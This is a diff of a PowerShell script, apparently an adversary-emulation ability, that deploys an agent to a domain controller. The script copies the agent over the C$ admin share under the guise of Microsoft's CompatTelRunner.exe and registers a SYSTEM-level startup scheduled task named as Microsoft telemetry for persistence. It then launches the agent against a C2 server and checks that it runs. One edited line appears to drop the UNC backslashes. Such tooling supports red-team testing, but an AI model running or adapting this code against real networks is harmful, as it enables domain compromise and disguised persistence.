@@ -17,25 +17,27 @@
           $c2Server = "#{server}";
           $localAgentPath = #{location};
 
-          $remoteAgentPath = "C:\ProgramData\Microsoft\Telemetry\CompatTelRunner.exe"
-          $uncDestination = "\\$dc\c$\" + $remoteAgentPath.Substring(3);
+          $remotePath = "ProgramData\Microsoft\Telemetry";
+          $remoteAgentPath = "$remotePath\CompatTelRunner.exe";
+          $uncDestination = "\\$dc\c$\" + $remoteAgentPath;
           $taskName = "Microsoft Compatibility Telemetry Runner";
           $newAgentGroup = "dc-pwned";
 
-          # --- Stage 1: Copy Agent to DC ---;
+          # Stage 1: Copy Agent to DC;
+          New-Item -Path "$dc\c$\$remotePath" -ItemType Directory -Force;
           Copy-Item -Path $localAgentPath -Destination $uncDestination -Force;
 
-          # --- Stage 2: Define and Create Scheduled Task for Persistence ---;
+          # Stage 2: Define and Create Scheduled Task for Persistence;
           $action = New-ScheduledTaskAction -Execute $remoteAgentPath -Argument "-server $c2Server -group $newAgentGroup";
           $trigger = New-ScheduledTaskTrigger -AtStartup;
           $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM";
           $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;
           Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -CimSession $dc -Force | Out-Null;
 
-          # --- Stage 3: Immediate Execution ---;
+          #  Stage 3: Immediate Execution ;
           Start-ScheduledTask -CimSession $dc -TaskName $taskName;
 
-          # --- Stage 4: Verification and Fact Creation ---;
+          #  Stage 4: Verification and Fact Creation ;
           Start-Sleep -Seconds 5;
           $taskCheck = Get-ScheduledTask -CimSession $dc -TaskName $taskName;
           if ($taskCheck.State -eq 'Running' -or $taskCheck.State -eq 'Ready') {
